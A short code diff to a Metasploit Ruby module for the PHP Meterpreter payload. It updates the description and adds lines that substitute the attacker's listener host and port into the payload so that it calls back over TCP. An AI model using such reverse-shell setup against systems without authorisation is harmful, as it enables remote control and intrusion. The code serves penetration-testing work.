@@ -23,7 +23,7 @@ module Metasploit3
 		super(update_info(info,
 			'Name'          => 'PHP Meterpreter',
 			'Version'       => '$Revision: 8984 $',
-			'Description'   => 'Run a meterpreter server in PHP',
+			'Description'   => 'Run a meterpreter server in PHP that connects to the attacker over TCP',
 			'Author'        => ['egypt'],
 			'Platform'      => 'php',
 			'Arch'          => ARCH_PHP,
@@ -37,6 +37,8 @@ module Metasploit3
 		met = File.open(file, "rb") {|f|
 			f.read(f.stat.size)
 		}
+		met.gsub!("127.0.0.1", datastore['LHOST'])
+		met.gsub!("4444", datastore['LPORT'])
 		met
 	end
 end
